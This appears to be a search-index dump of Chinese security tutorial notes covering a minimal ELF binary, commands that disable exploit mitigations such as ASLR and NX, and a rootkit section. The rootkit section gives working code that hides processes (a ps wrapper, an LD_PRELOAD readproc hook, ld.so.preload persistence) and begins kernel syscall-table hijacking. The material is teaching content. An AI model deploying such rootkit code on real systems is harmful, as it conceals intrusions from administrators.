\u662f\u56e0\u70ba glibc \u5e6b\u4f60\u505a\u597d\u9019\u4e9b\u4e8b\u4e86 gdb \u6211\u5011\u53ef\u4ee5\u7528 gdb \u628a\u7a0b\u5f0f\u8dd1\u8d77\u4f86\u770b\u770b \u7528 starti \u505c\u5728\u7a0b\u5f0f\u5165\u53e3\u9ede \u770b\u8d77\u4f86\u597d\u8212\u723d \u7e3d\u7d50 \u6700\u5f8c\u6211\u5011\u7684 ELF 64-bit executable \u5171 124 bytes \u5df2\u7d93\u5f88\u77ed\u4e86\u4f46\u9084\u53ef\u4ee5\u66f4\u77ed \u6bd4\u5982\u8aaa\u628a\u4e00\u4e9b\u7d50\u69cb\u91cd\u758a\u5728\u4e00\u8d77\u9032\u800c\u6e1b\u5c11\u7a7a\u9593 \u4e0d\u904e\u9019\u53ea\u662f\u500b\u5c0f\u5c0f\u7df4\u7fd2\u5c31\u4e0d\u518d\u82b1\u6642\u9593\u4e86 https://www.nasm.us/doc/nasmdoc3.html#section-3.5 \u21a9 https://www.muppetlabs.com/~breadbox/software/tiny/teensy.html \u21a9","title":"Minimal ELF 64-bit - 124 bytes"},{"location":"security/pwn/minimal-elf/#_1","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 org 0x0000555555554000 ehdr: db 0x7f , \" ELF \" , 2 , 1 , 1 , 0 ; e_ident dq 0 dw 2 ; e_type (EXEC) dw 0x3e ; e_machine (x86_64) dd 1 ; e_version dq _start ; e_entry dq phdr - $$ ; e_phoff dq 0 ; e_shoff dd 0 ; e_flags dw ehdrsize ; e_ehsize dw phdrsize ; e_phentsize dw 1 ; e_phnum dw 0 ; e_shentsize dw 0 ; e_shnum dw 0 ; e_shstrndx ehdrsize equ $ - ehdr phdr: dd 1 ; p_type (PT_LOAD) dd 5 ; p_flags dq 0 ; p_offset dq $$ ; p_vaddr dq $$ ; p_paddr dq filesize ; p_filesz dq filesize ; p_memsz dq 0x1000 ; p_align phdrsize equ $ - phdr _start: mov al , 60 syscall filesize equ $ - $$ $ \u548c $$ \u662f\u4ec0\u9ebc? 1 $ \u4ee3\u8868\u76ee\u524d\u7684\u4f4d\u5740 $$ \u4ee3\u8868\u76ee\u524d section \u958b\u982d\u7684\u4f4d\u5740 ( \u5728\u9019\u500b\u4f8b\u5b50\u662f 0x0000555555554000 )","title":"\u539f\u59cb\u78bc"},{"location":"security/pwn/minimal-elf/#_2","text":"nasm tiny.asm","title":"\u7de8\u8b6f"},{"location":"security/pwn/minimal-elf/#_3","text":"","title":"\u89e3\u91cb"},{"location":"security/pwn/minimal-elf/#elf-structure","text":"wikipedia \u5beb\u5f97\u5f88\u6e05\u695a \u4e5f\u53ef\u4ee5\u770b\u9019\u500b\u7dda\u4e0a glibc \u7684\u539f\u59cb\u78bc glibc/elf/elf.h \u6216\u662f man page \u4e5f\u6709 man elf","title":"ELF structure"},{"location":"security/pwn/minimal-elf/#elf-header","text":"1 org 0x0000555555554000 \u6c92\u6709\u958b ASLR \u7684\u6642\u5019\uff0c\u4e00\u822c\u7684 ELF \u90fd\u6703\u5f9e 0x0000555555554000 \u9019\u500b\u4f4d\u5740\u958b\u59cb\uff0c\u6240\u4ee5\u6211\u5011\u4e5f\u5f9e\u9019\u500b\u4f4d\u5740\u958b\u59cb 4 5 db 0x7f , \" ELF \" , 2 , 1 , 1 , 0 ; e_ident dq 0 \u6bd4\u8f03\u91cd\u8981\u7684\u5c31\u662f\u90a3\u500b 2 \u4ee3\u8868 64-bit \u5269\u4e0b\u7684\u5c31\u4e0d\u592a\u91cd\u8981\u4e86\uff0c\u53ef\u4ee5\u5ffd\u7565\u4e0d\u770b \u5176\u5be6\u4e5f\u5c31\u662f\u7de8\u4e00\u500b\u6b63\u5e38\u7684 ELF 64-bit executable \u53c3\u8003\u4e00\u4e0b 9 dq _start ; e_entry \u9019\u88e1\u8981\u586b\u7684\u662f\u7a0b\u5f0f\u7684\u5165\u53e3\u9ede\uff0c\u4e5f\u5c31\u662f\u6211\u5011\u5b9a\u7fa9\u7684 _start 10 11 dq phdr - $$ ; e_phoff dq 0 ; e_shoff \u56e0\u70ba secion header table \u5728\u57f7\u884c\u7684\u6642\u5019\u4e0d\u6703\u7528\u5230\uff0c\u6240\u4ee5\u6211\u5011\u53ea\u8981\u69cb\u9020 program header table \u6240\u4ee5 section header table \u7684 offset \u5c31\u586b 0 \u5c31\u597d","title":"\u7b2c\u4e00\u90e8\u5206 : ELF header"},{"location":"security/pwn/minimal-elf/#program-header-table","text":"24 dd 5 ; p_flags \u9019\u88e1\u586b 5 \u4ee3\u8868\u9019\u500b\u6bb5\u53ef\u8b80\u53ef\u57f7\u884c\uff0c\u9019\u6a23\u6211\u5011\u7684\u4e0b\u9762\u7684 _start \u624d\u53ef\u4ee5\u57f7\u884c 25 26 27 dq 0 ; p_offset dq $$ ; p_vaddr dq $$ ; p_paddr \u56e0\u70ba\u7e3d\u5171\u5c31\u53ea\u6709\u4e00\u500b\u6bb5\uff0c\u5305\u542b\u4e86\u6574\u500b\u6a94\u6848\u9023\u540c\u524d\u9762\u7684 ELF header \u548c\u5f8c\u9762\u7684 _start \u4e00\u8d77\uff0c\u6240\u4ee5\u6bb5\u7684\u958b\u982d\u5728 ELF header \u7684\u958b\u982d p_offset \u662f\u6307\u9019\u500b\u6bb5\u5728\u6a94\u6848\u4e2d\u7684\u504f\u79fb\uff0c\u6240\u4ee5\u662f 0 p_vaddr \u662f\u6307\u9019\u500b\u6bb5\u5728\u8a18\u61b6\u9ad4\u4e2d\u7684\u4f4d\u5740\uff0c\u6240\u4ee5\u662f $$ p_paddr \u57fa\u672c\u4e0a\u8ddf p_vaddr \u4e00\u6a23","title":"\u7b2c\u4e8c\u90e8\u5206 : program header table"},{"location":"security/pwn/minimal-elf/#assembly-code","text":"34 35 36 _start: mov al , 60 syscall \u9019\u88e1\u5c31\u662f\u53eb sys_exit \u8b93\u7a0b\u5f0f\u6b63\u5e38\u7d50\u675f \u4e00\u822c\u4e0d\u6703\u7279\u5225\u9700\u8981\u5728\u7a0b\u5f0f\u7d50\u675f\u7684\u6642\u5019\u5beb sys_exit \u662f\u56e0\u70ba glibc \u5e6b\u4f60\u505a\u597d\u9019\u4e9b\u4e8b\u4e86","title":"\u7b2c\u4e09\u90e8\u5206 : assembly code"},{"location":"security/pwn/minimal-elf/#gdb","text":"\u6211\u5011\u53ef\u4ee5\u7528 gdb \u628a\u7a0b\u5f0f\u8dd1\u8d77\u4f86\u770b\u770b \u7528 starti \u505c\u5728\u7a0b\u5f0f\u5165\u53e3\u9ede \u770b\u8d77\u4f86\u597d\u8212\u723d","title":"gdb"},{"location":"security/pwn/minimal-elf/#_4","text":"\u6700\u5f8c\u6211\u5011\u7684 ELF 64-bit executable \u5171 124 bytes \u5df2\u7d93\u5f88\u77ed\u4e86\u4f46\u9084\u53ef\u4ee5\u66f4\u77ed \u6bd4\u5982\u8aaa\u628a\u4e00\u4e9b\u7d50\u69cb\u91cd\u758a\u5728\u4e00\u8d77\u9032\u800c\u6e1b\u5c11\u7a7a\u9593 \u4e0d\u904e\u9019\u53ea\u662f\u500b\u5c0f\u5c0f\u7df4\u7fd2\u5c31\u4e0d\u518d\u82b1\u6642\u9593\u4e86 https://www.nasm.us/doc/nasmdoc3.html#section-3.5 \u21a9 https://www.muppetlabs.com/~breadbox/software/tiny/teensy.html \u21a9","title":"\u7e3d\u7d50"},{"location":"security/pwn/protection/","text":"\u4fdd\u8b77\u6a5f\u5236 \u4f7f\u7528 checksec \u4f86\u67e5\u770b\u4fdd\u8b77\u6a5f\u5236 RELRO Partial RELRO: GOT writable Full RELRO: GOT read only, no link_map and dl_resolver pointer No RELRO : gcc -Wl,-z,norelro code.c Partial RELRO : GCC COMPILE DEFAULT Full RELRO : gcc -Wl,-z,relro,-z,now code.c CANARY stack overflow - gcc generate canary or not \u7576 buffer \u5920\u5927\u6642\uff0cgcc \u6703\u81ea\u52d5\u52a0 canary Enable: GCC COMPILE DEFAULT (when buffer large enough) Disable : gcc -fno-stack-protector code.c NX (No-Execute) / DEP (Data Execution Prevention) \u53ef\u4ee5\u5beb\u7684\u5730\u65b9\u4e0d\u80fd\u57f7\u884c Enable : GCC COMPILE DEFAULT Enable : execstack -s code Disable : gcc -z execstack code.c Disable : execstack -c code ASLR (Address Space Layout Randomization) Configuring ASLR with randomize_va_space 0 - \u8868\u793a\u95dc\u9589\u9032\u7a0b\u5730\u5740\u7a7a\u9593\u96a8\u6a5f\u5316\u3002 1 - \u8868\u793a mmap, stack, vdso \u96a8\u6a5f\u5316\u3002 2 - \u8868\u793a\u6bd4 1 \u591a\u4e86 heap \u96a8\u6a5f\u5316\u3002 sudo -s echo 0 > /proc/sys/kernel/randomize_va_space sudo sysctl -w kernel.randomize_va_space=0 PIE (Position Independent Executables) \u4f4d\u7f6e\u96a8\u6a5f\u5316 Enable : gcc -fpie -pie code.c Disable : GCC COMPILE DEFAULT FRAME POINTER \u4e0d\u77e5\u9053\u7b97\u4e0d\u7b97\u4fdd\u8b77 O_O ? \u6709\u958b\u7684\u8a71\u662f leave ret \u6c92\u958b\u7684\u8a71\u662f add rsp, 0x18 ret Enable GCC COMPILE DEFAULT Disable : gcc -fomit-frame-pointer code.c","title":"\u4fdd\u8b77\u6a5f\u5236"},{"location":"security/pwn/protection/#_1","text":"\u4f7f\u7528 checksec \u4f86\u67e5\u770b\u4fdd\u8b77\u6a5f\u5236","title":"\u4fdd\u8b77\u6a5f\u5236"},{"location":"security/pwn/protection/#relro","text":"Partial RELRO: GOT writable Full RELRO: GOT read only, no link_map and dl_resolver pointer No RELRO : gcc -Wl,-z,norelro code.c Partial RELRO : GCC COMPILE DEFAULT Full RELRO : gcc -Wl,-z,relro,-z,now code.c","title":"RELRO"},{"location":"security/pwn/protection/#canary","text":"stack overflow - gcc generate canary or not \u7576 buffer \u5920\u5927\u6642\uff0cgcc \u6703\u81ea\u52d5\u52a0 canary Enable: GCC COMPILE DEFAULT (when buffer large enough) Disable : gcc -fno-stack-protector code.c","title":"CANARY"},{"location":"security/pwn/protection/#nx-no-execute-dep-data-execution-prevention","text":"\u53ef\u4ee5\u5beb\u7684\u5730\u65b9\u4e0d\u80fd\u57f7\u884c Enable : GCC COMPILE DEFAULT Enable : execstack -s code Disable : gcc -z execstack code.c Disable : execstack -c code","title":"NX (No-Execute) / DEP (Data Execution Prevention)"},{"location":"security/pwn/protection/#aslr-address-space-layout-randomization","text":"Configuring ASLR with randomize_va_space 0 - \u8868\u793a\u95dc\u9589\u9032\u7a0b\u5730\u5740\u7a7a\u9593\u96a8\u6a5f\u5316\u3002 1 - \u8868\u793a mmap, stack, vdso \u96a8\u6a5f\u5316\u3002 2 - \u8868\u793a\u6bd4 1 \u591a\u4e86 heap \u96a8\u6a5f\u5316\u3002 sudo -s echo 0 > /proc/sys/kernel/randomize_va_space sudo sysctl -w kernel.randomize_va_space=0","title":"ASLR (Address Space Layout Randomization)"},{"location":"security/pwn/protection/#pie-position-independent-executables","text":"\u4f4d\u7f6e\u96a8\u6a5f\u5316 Enable : gcc -fpie -pie code.c Disable : GCC COMPILE DEFAULT","title":"PIE (Position Independent Executables)"},{"location":"security/pwn/protection/#frame-pointer","text":"\u4e0d\u77e5\u9053\u7b97\u4e0d\u7b97\u4fdd\u8b77 O_O ? \u6709\u958b\u7684\u8a71\u662f leave ret \u6c92\u958b\u7684\u8a71\u662f add rsp, 0x18 ret Enable GCC COMPILE DEFAULT Disable : gcc -fomit-frame-pointer code.c","title":"FRAME POINTER"},{"location":"security/pwn/rootkit/","text":"rootkit \u662f\u96b1\u85cf\u7a0b\u5f0f\u7684\u6280\u8853 Basic \u5728 $PATH \u74b0\u5883\u8b8a\u6578\u4e2d /usr/local/bin \u5728 /bin \u524d\u9762 \u6240\u4ee5\u6211\u5011\u53ef\u4ee5\u5beb\u4e00\u500b\u6a94\u6848\u5728 /usr/local/bin/ps #!/bin/bash /bin/ps $@ | grep -Ev '192.168.100.100|socat' \u9019\u6a23\u5c31\u53ef\u4ee5\u505a\u5230\u7c21\u55ae\u7684\u904e\u6ffe\u5b57\u4e32\u4e86 grep -Ev \u662f inverse match $@ \u662f\u50b3\u9032\u4f86\u7684\u53c3\u6578 ( \u9019\u88e1\u539f\u5c01\u4e0d\u52d5\u7684\u4ea4\u7d66 /bin/ps ) LD_PRELOAD \u539f\u59cb\u78bc 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 #define _GNU_SOURCE #include <dlfcn.h> #include <string.h> #include <proc/readproc.h> int hidden ( char * target ) { char * keywords [ 2 ] = { \"192.168.100.100\" , \"socat\" }; for ( int i = 0 ; i < 2 ; i ++ ) if ( strstr ( target , keywords [ i ])) return 1 ; return 0 ; } proc_t * readproc ( PROCTAB * PT , proc_t * return_buf ) { typeof ( readproc ) * old_readproc = dlsym ( RTLD_NEXT , \"readproc\" ); proc_t * ret_value = old_readproc ( PT , return_buf ); while ( ret_value && ret_value -> cmdline && hidden ( ret_value -> cmdline [ 0 ])) { ret_value = old_readproc ( PT , return_buf ); } return ret_value ; } \u89e3\u91cb \u9996\u5148\u6211\u5011\u53ef\u4ee5\u7528 ltrace \u770b ps \u8dd1\u8d77\u4f86\u6703\u547c\u53eb\u4ec0\u9ebc library \u7684\u51fd\u5f0f ... fwrite ( \" [jfsCommit] \\n he] \\n 4 \\n 0 \\n\\n start \\n grou\" ..., 13 , 1 , 0x7fbfcd303760 ) = 1 readproc ( 0x55e061b12f90 , 0x55e0609d1540 , 13 , 1024 ) = 0x55e0609d1540 escape_str ( 0x7fbfcd90b090 , 0x55e0609d1740 , 0x20000 , 0x7fff6f748044 ) = 4 strlen ( \"root\" ) = 4 fwrite ( \"root\" , 4 , 1 , 0x7fbfcd303760 ) = 1 ... \u7136\u5f8c\u6703\u767c\u73fe readproc \u4e00\u76f4\u51fa\u73fe man \u662f\u9019\u6a23\u4ecb\u7d39\u9019\u500b\u51fd\u5f0f\u7684 : read information from next /proc/## entry \u5728 ps \u7684\u539f\u59cb\u78bc\u4e2d\u67e5\u4e86\u4e00\u4e0b \u5982\u4f55\u53d6\u5f97 ps \u539f\u59cb\u78bc ps \u9019\u500b\u6307\u4ee4\u662f\u4f86\u81ea procps \uff0c\u53ef\u4ee5\u5f9e procps.sourceforge.net \u4e0b\u8f09 \u53e6\u5916\u5176\u4ed6\u57fa\u672c\u7684 shell \u6307\u4ee4\u7684\u539f\u59cb\u78bc\u53ef\u4ee5\u5f9e www.gnu.org/software/coreutils \u4e0b\u8f09 procps-3.2.8/ps/display.c 331 332 333 334 335 336 337 338 339 ptp = openproc ( needs_for_format | needs_for_sort | needs_for_select | needs_for_threads ); if ( ! ptp ) { fprintf ( stderr , \"Error: can not access /proc. \\n \" ); exit ( 1 ); } memset ( & buf , '#' , sizeof ( proc_t )); switch ( thread_flags & ( TF_show_proc | TF_loose_tasks | TF_show_task )){ case TF_show_proc : // normal non-thread output while ( readproc ( ptp , & buf )){}} \u57fa\u672c\u4e0a\u5c31\u662f openproc \u7136\u5f8c\u518d\u7528 readproc \u4e00\u6b21\u8b80\u4e00\u500b process entry ptp \u7684\u578b\u614b\u662f PROCTAB* \uff0c\u8b93\u7a0b\u5f0f\u80fd\u627e\u5230\u4e0b\u4e00\u500b process buf \u7684\u578b\u614b\u662f proc_t* \uff0c\u5305\u542b\u4e86 process \u7684\u8cc7\u8a0a \u90a3\u6211\u5011\u5c31\u53bb hijack readproc \u9019\u500b\u51fd\u5f0f\uff0c\u770b\u5230\u60f3\u96b1\u85cf\u7684 procss \u5c31\u8df3\u904e\u5b83 13 typeof ( readproc ) * old_readproc = dlsym ( RTLD_NEXT , \"readproc\" ); \u9019\u884c\u662f LD_PRELOAD \u6280\u5de7\u7684\u95dc\u9375\uff0c\u7528 dlsym \u9019\u500b function \u627e\u56de\u539f\u672c\u7684\u51fd\u5f0f typeof(readproc) \u53ea\u662f\u4e00\u500b\u8a9e\u6cd5\u7cd6\uff0c\u4ee3\u8868 readproc \u9019\u500b function pointer \u7684\u578b\u614b ( \u9019\u6a23\u5c31\u4e0d\u7528\u518d\u6253\u4e00\u6b21\u4e86 ) 14 15 16 17 18 19 proc_t * ret_value = old_readproc ( PT , return_buf ); while ( ret_value && ret_value -> cmdline && hidden ( ret_value -> cmdline [ 0 ])) { ret_value = old_readproc ( PT , return_buf ); } \u5148\u6b63\u5e38\u8b80\u4e00\u500b procss entry\uff0c\u6aa2\u67e5 cmdline \u6709\u6c92\u6709\u6211\u5011\u60f3\u8981\u96b1\u85cf\u7684 process \u6709\u7684\u8a71\u5c31\u518d\u547c\u53eb\u4e00\u6b21 old_readproc \u8b80\u4e0b\u4e00\u500b process \u7de8\u8b6f gcc -fPIC -shared -o hook.so hook.c \u57f7\u884c LD_PRELOAD \u53ea\u6709\u8a72\u6b21\u57f7\u884c\u6703\u8f09\u5165 LD_PRELOAD = /path/to/hook.so ps aux ld.so.preload \u7de8\u8f2f ld.so.preload \uff0c\u5beb\u5165 hook.so \u7684\u8def\u5f91\uff0c\u4e4b\u5f8c\u6bcf\u6b21\u57f7\u884c\u90fd\u6703\u8f09\u5165 /path/to/hook.so \u53ef\u4ee5\u7528 ldd \u67e5\u770b\u662f\u5426\u6210\u529f preload Loadable Kernel Module \u53d6\u5f97 sys_call_table \u9996\u5148\u56e0\u70ba\u6211\u5011\u8981 hijack system call \u6240\u4ee5\u8981\u5148\u53d6\u5f97 sys_call_table \u7684\u4f4d\u5740 \u65b9\u6cd5\u4e00 \u5728 2.4 \u4ee5\u524d\u7684\u5167\u6838\u7248\u672c\uff0c\u9810\u8a2d\u5c0e\u51fa\u6240\u6709\u7b26\u865f\uff0c\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u7528 extern void * sys_call_table []; \u5982\u679c\u81ea\u5df1\u7de8\u8b6f\u5167\u6838\u7684\u8a71\uff0c\u53ef\u4ee5\u4fee\u6539\u539f\u59cb\u78bc\u7528 EXPORT_SYMBOL \u628a sys_call_table \u7684\u7b26\u865f\u5c0e\u51fa\u4f86 \u65b9\u6cd5\u4e8c /boot/System.map-$(uname -r) \u9019\u500b\u6a94\u6848\u8a18\u9304\u4e86\u7de8\u8b6f\u6642\u5167\u6838\u7b26\u865f\u7684\u5730\u5740\uff0c\u4f46\u662f\u9019\u500b\u6a94\u6848\u4e0d\u4fdd\u8b49\u5b58\u5728 command grep \"sys_call_table\" /boot/System.map- $( uname -r ) output ffffffff81e001a0 R sys_call_table ffffffff81e01560 R ia32_sys_call_table \u65b9\u6cd5\u4e09 /proc/kallsyms \u662f\u4e00\u500b\u7279\u6b8a\u7684\u6a94\u6848\uff0c\u6703\u5728\u8b80\u53d6\u7684\u6642\u5019\u52d5\u614b\u7522\u751f\uff0c\u53ef\u4ee5\u53c3\u8003 /kernel/kallsyms.c#L705 command cat /proc/kallsyms | grep \"sys_call_table\" output ffffffff92a001a0 R sys_call_table ffffffff92a01560 R ia32_sys_call_table \u65b9\u6cd5\u56db \u6e90\u81ea\u65bc \u9019\u7bc7 \u7528 sidt \u9019\u500b\u6307\u4ee4\u7372\u53d6 Interrupt Descriptor Table (IDT) \u7684\u4f4d\u5740 IDT \u4e0a\u7684\u7b2c 0x80 \u500b\u6b04\u4f4d\u5b58\u6709 system_call \u7684\u4f4d\u5740 system_call \u88e1\u9762\u7684\u5176\u4e2d\u4e00\u884c\u6307\u4ee4 call sys_call_table(,eax,4) \u6709\u7528\u5230 sys_call_table \u6240\u4ee5\u5728 system_call \u88e1\u9762\u67e5\u627e\u90a3\u4e00\u884c\u6307\u4ee4\u7684\u982d\u4e09\u500b byte \\xff\\x14\\x85 \uff0c\u5f8c\u9762\u5c31\u662f\u6211\u5011\u8981\u7684 sys_call_table \u65b9\u6cd5\u4e94 \u4f7f\u7528 kallsyms_lookup_name #include <linux/kallsyms.h> static void ** sys_call_table ; static int __init hook_init ( void ) { sys_call_table = ( void ** ) kallsyms_lookup_name ( \"sys_call_table\" ); printk ( KERN_INFO \"sys_call_table = 0x%px \\n \" , sys_call_table ); return 0 ; } printk a pointer[^6] \u8981\u7528 printk \u5370\u51fa pointer \u53ef\u4ee5\u7528 %px %p \u53ea\u6703\u5370\u51fa\u8a72\u6307\u6a19\u7684\u96dc\u6e4a\u503c\u800c\u4e0d\u662f\u771f\u6b63\u7684\u6307\u6a19\u7684\u503c\uff0c\u9019\u662f\u70ba\u4e86\u907f\u514d\u6d29\u6f0f\u5167\u6838\u4f4d\u5740 \u8b93 sys_call_table \u53ef\u4ee5\u5beb\u5165 \u56e0\u70ba sys_call_table \u662f\u552f\u8b80\u7684\uff0c\u6240\u4ee5\u6211\u5011\u900f\u904e\u4fee\u6539 cr0 \u4f86\u95dc\u9589\u5beb\u5165\u4fdd\u8b77 void writable_unlock ( void ) { write_cr0 ( read_cr0 () & ( ~ X86_CR0_WP )); } void writable_lock ( void ) { write_cr0 ( read_cr0 () | X86_CR0_WP ); } \u672a\u5b8c\u5f85\u7e8c http://fluxius.handgrep.se/2011/10/31/the-magic-of-ld_preload-for-userland-rootkits/ \u21a9 https://exploit.ph/linux-kernel-hacking/2014/10/23/rootkit-for-hiding-files/ \u21a9 https://docs-conquer-the-universe.readthedocs.io/zh_CN/latest/gnu_linux.html \u21a9 https://www.kernel.org/doc/Documentation/printk-formats.txt \u21a9 https://blog.trailofbits.com/2019/01/17/how-to-write-a-rootkit-without-really-trying/ \u21a9","title":"\u96b1\u85cf\u7a0b\u5e8f\u6280\u5de7 (rootkit)"},{"location":"security/pwn/rootkit/#basic","text":"\u5728 $PATH \u74b0\u5883\u8b8a\u6578\u4e2d /usr/local/bin \u5728 /bin \u524d\u9762 \u6240\u4ee5\u6211\u5011\u53ef\u4ee5\u5beb\u4e00\u500b\u6a94\u6848\u5728 /usr/local/bin/ps #!/bin/bash /bin/ps $@ | grep -Ev '192.168.100.100|socat' \u9019\u6a23\u5c31\u53ef\u4ee5\u505a\u5230\u7c21\u55ae\u7684\u904e\u6ffe\u5b57\u4e32\u4e86 grep -Ev \u662f inverse match $@ \u662f\u50b3\u9032\u4f86\u7684\u53c3\u6578 ( \u9019\u88e1\u539f\u5c01\u4e0d\u52d5\u7684\u4ea4\u7d66 /bin/ps )","title":"Basic"},{"location":"security/pwn/rootkit/#ld_preload","text":"","title":"LD_PRELOAD"},{"location":"security/pwn/rootkit/#_1","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 #define _GNU_SOURCE #include <dlfcn.h> #include <string.h> #include <proc/readproc.h> int hidden ( char * target ) { char * keywords [ 2 ] = { \"192.168.100.100\" , \"socat\" }; for ( int i = 0 ; i < 2 ; i ++ ) if ( strstr ( target , keywords [ i ])) return 1 ; return 0 ; } proc_t * readproc ( PROCTAB * PT , proc_t * return_buf ) { typeof ( readproc ) * old_readproc = dlsym ( RTLD_NEXT , \"readproc\" ); proc_t * ret_value = old_readproc ( PT , return_buf ); while ( ret_value && ret_value -> cmdline && hidden ( ret_value -> cmdline [ 0 ])) { ret_value = old_readproc ( PT , return_buf ); } return ret_value ; }","title":"\u539f\u59cb\u78bc"},{"location":"security/pwn/rootkit/#_2","text":"\u9996\u5148\u6211\u5011\u53ef\u4ee5\u7528 ltrace \u770b ps \u8dd1\u8d77\u4f86\u6703\u547c\u53eb\u4ec0\u9ebc library \u7684\u51fd\u5f0f ... fwrite ( \" [jfsCommit] \\n he] \\n 4 \\n 0 \\n\\n start \\n grou\" ..., 13 , 1 , 0x7fbfcd303760 ) = 1 readproc ( 0x55e061b12f90 , 0x55e0609d1540 , 13 , 1024 ) = 0x55e0609d1540 escape_str ( 0x7fbfcd90b090 , 0x55e0609d1740 , 0x20000 , 0x7fff6f748044 ) = 4 strlen ( \"root\" ) = 4 fwrite ( \"root\" , 4 , 1 , 0x7fbfcd303760 ) = 1 ... \u7136\u5f8c\u6703\u767c\u73fe readproc \u4e00\u76f4\u51fa\u73fe man \u662f\u9019\u6a23\u4ecb\u7d39\u9019\u500b\u51fd\u5f0f\u7684 : read information from next /proc/## entry \u5728 ps \u7684\u539f\u59cb\u78bc\u4e2d\u67e5\u4e86\u4e00\u4e0b \u5982\u4f55\u53d6\u5f97 ps \u539f\u59cb\u78bc ps \u9019\u500b\u6307\u4ee4\u662f\u4f86\u81ea procps \uff0c\u53ef\u4ee5\u5f9e procps.sourceforge.net \u4e0b\u8f09 \u53e6\u5916\u5176\u4ed6\u57fa\u672c\u7684 shell \u6307\u4ee4\u7684\u539f\u59cb\u78bc\u53ef\u4ee5\u5f9e www.gnu.org/software/coreutils \u4e0b\u8f09 procps-3.2.8/ps/display.c 331 332 333 334 335 336 337 338 339 ptp = openproc ( needs_for_format | needs_for_sort | needs_for_select | needs_for_threads ); if ( ! ptp ) { fprintf ( stderr , \"Error: can not access /proc. \\n \" ); exit ( 1 ); } memset ( & buf , '#' , sizeof ( proc_t )); switch ( thread_flags & ( TF_show_proc | TF_loose_tasks | TF_show_task )){ case TF_show_proc : // normal non-thread output while ( readproc ( ptp , & buf )){}} \u57fa\u672c\u4e0a\u5c31\u662f openproc \u7136\u5f8c\u518d\u7528 readproc \u4e00\u6b21\u8b80\u4e00\u500b process entry ptp \u7684\u578b\u614b\u662f PROCTAB* \uff0c\u8b93\u7a0b\u5f0f\u80fd\u627e\u5230\u4e0b\u4e00\u500b process buf \u7684\u578b\u614b\u662f proc_t* \uff0c\u5305\u542b\u4e86 process \u7684\u8cc7\u8a0a \u90a3\u6211\u5011\u5c31\u53bb hijack readproc \u9019\u500b\u51fd\u5f0f\uff0c\u770b\u5230\u60f3\u96b1\u85cf\u7684 procss \u5c31\u8df3\u904e\u5b83 13 typeof ( readproc ) * old_readproc = dlsym ( RTLD_NEXT , \"readproc\" ); \u9019\u884c\u662f LD_PRELOAD \u6280\u5de7\u7684\u95dc\u9375\uff0c\u7528 dlsym \u9019\u500b function \u627e\u56de\u539f\u672c\u7684\u51fd\u5f0f typeof(readproc) \u53ea\u662f\u4e00\u500b\u8a9e\u6cd5\u7cd6\uff0c\u4ee3\u8868 readproc \u9019\u500b function pointer \u7684\u578b\u614b ( \u9019\u6a23\u5c31\u4e0d\u7528\u518d\u6253\u4e00\u6b21\u4e86 ) 14 15 16 17 18 19 proc_t * ret_value = old_readproc ( PT , return_buf ); while ( ret_value && ret_value -> cmdline && hidden ( ret_value -> cmdline [ 0 ])) { ret_value = old_readproc ( PT , return_buf ); } \u5148\u6b63\u5e38\u8b80\u4e00\u500b procss entry\uff0c\u6aa2\u67e5 cmdline \u6709\u6c92\u6709\u6211\u5011\u60f3\u8981\u96b1\u85cf\u7684 process \u6709\u7684\u8a71\u5c31\u518d\u547c\u53eb\u4e00\u6b21 old_readproc \u8b80\u4e0b\u4e00\u500b process","title":"\u89e3\u91cb"},{"location":"security/pwn/rootkit/#_3","text":"gcc -fPIC -shared -o hook.so hook.c","title":"\u7de8\u8b6f"},{"location":"security/pwn/rootkit/#_4","text":"","title":"\u57f7\u884c"},{"location":"security/pwn/rootkit/#ld_preload_1","text":"\u53ea\u6709\u8a72\u6b21\u57f7\u884c\u6703\u8f09\u5165 LD_PRELOAD = /path/to/hook.so ps aux","title":"LD_PRELOAD"},{"location":"security/pwn/rootkit/#ldsopreload","text":"\u7de8\u8f2f ld.so.preload \uff0c\u5beb\u5165 hook.so \u7684\u8def\u5f91\uff0c\u4e4b\u5f8c\u6bcf\u6b21\u57f7\u884c\u90fd\u6703\u8f09\u5165 /path/to/hook.so \u53ef\u4ee5\u7528 ldd \u67e5\u770b\u662f\u5426\u6210\u529f preload","title":"ld.so.preload"},{"location":"security/pwn/rootkit/#loadable-kernel-module","text":"","title":"Loadable Kernel Module"},{"location":"security/pwn/rootkit/#sys_call_table","text":"\u9996\u5148\u56e0\u70ba\u6211\u5011\u8981 hijack system call \u6240\u4ee5\u8981\u5148\u53d6\u5f97 sys_call_table \u7684\u4f4d\u5740","title":"\u53d6\u5f97 sys_call_table"},{"location":"security/pwn/rootkit/#_5","text":"\u5728 2.4 \u4ee5\u524d\u7684\u5167\u6838\u7248\u672c\uff0c\u9810\u8a2d\u5c0e\u51fa\u6240\u6709\u7b26\u865f\uff0c\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u7528 extern void * sys_call_table []; \u5982\u679c\u81ea\u5df1\u7de8\u8b6f\u5167\u6838\u7684\u8a71\uff0c\u53ef\u4ee5\u4fee\u6539\u539f\u59cb\u78bc\u7528 EXPORT_SYMBOL \u628a sys_call_table \u7684\u7b26\u865f\u5c0e\u51fa\u4f86","title":"\u65b9\u6cd5\u4e00"},{"location":"security/pwn/rootkit/#_6","text":"/boot/System.map-$(uname -r) \u9019\u500b\u6a94\u6848\u8a18\u9304\u4e86\u7de8\u8b6f\u6642\u5167\u6838\u7b26\u865f\u7684\u5730\u5740\uff0c\u4f46\u662f\u9019\u500b\u6a94\u6848\u4e0d\u4fdd\u8b49\u5b58\u5728 command grep \"sys_call_table\" /boot/System.map- $( uname -r ) output ffffffff81e001a0 R sys_call_table ffffffff81e01560 R ia32_sys_call_table","title":"\u65b9\u6cd5\u4e8c"},{"location":"security/pwn/rootkit/#_7","text":"/proc/kallsyms \u662f\u4e00\u500b\u7279\u6b8a\u7684\u6a94\u6848\uff0c\u6703\u5728\u8b80\u53d6\u7684\u6642\u5019\u52d5\u614b\u7522\u751f\uff0c\u53ef\u4ee5\u53c3\u8003 /kernel/kallsyms.c#L705 command cat /proc/kallsyms | grep \"sys_call_table\" output ffffffff92a001a0 R sys_call_table ffffffff92a01560 R 